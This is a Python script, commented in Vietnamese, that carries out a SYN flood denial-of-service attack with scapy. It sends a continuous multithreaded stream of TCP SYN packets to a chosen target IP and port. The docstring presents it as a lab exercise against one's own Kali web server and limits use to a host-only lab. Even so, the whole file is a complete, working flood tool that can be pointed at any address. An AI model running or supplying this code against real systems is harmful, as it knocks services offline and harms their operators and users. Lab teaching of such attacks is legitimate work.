#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
syn_flood.py — Giả lập SYN flood (DDoS) từ Windows vào web server trên Kali.

YÊU CẦU:
    pip install scapy
    Cài Npcap (https://npcap.com) với chế độ "WinPcap API-compatible Mode"
    Chạy PowerShell/CMD bằng QUYỀN ADMINISTRATOR.

Chỉ dùng trong LAB host-only của chính bạn.

Ví dụ:
    python syn_flood.py --target 192.168.56.20 --port 80 --threads 4
"""
import argparse
import sys
import threading
import time
import random


def flood(target: str, port: int, stop: threading.Event, thread_id: int):
    try:
        from scapy.all import IP, TCP, send, RandShort  # noqa: E402
    except ImportError:
        print("Cần cài: pip install scapy (và Npcap với quyền Admin)")
        return
    count = 0
    while not stop.is_set():
        try:
            pkt = IP(dst=target) / TCP(sport=RandShort(), dport=port, flags="S",
                                       seq=random.randint(0, 2**31))
            send(pkt, verbose=0)
            count += 1
            if count % 200 == 0:
                print(f"    [thread {thread_id}] đã gửi {count} SYN")
        except PermissionError:
            print("    [!] Lỗi quyền — hãy chạy bằng Administrator và đã cài Npcap")
            return
        except Exception as e:  # noqa: BLE001
            print(f"    [thread {thread_id}] lỗi: {e}")
            time.sleep(0.5)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--threads", type=int, default=2)
    ap.add_argument("--seconds", type=float, default=0, help="0 = chạy đến khi Ctrl+C")
    args = ap.parse_args()

    stop = threading.Event()
    threads = [threading.Thread(target=flood, args=(args.target, args.port, stop, i), daemon=True)
               for i in range(max(1, args.threads))]
    print(f"[flood] SYN flood {args.target}:{args.port} bằng {args.threads} threads "
          f"({'Ctrl+C để dừng' if not args.seconds else f'{args.seconds}s'})")
    for t in threads:
        t.start()
    try:
        if args.seconds:
            time.sleep(args.seconds)
            stop.set()
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        stop.set()
    print("[flood] Dừng.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
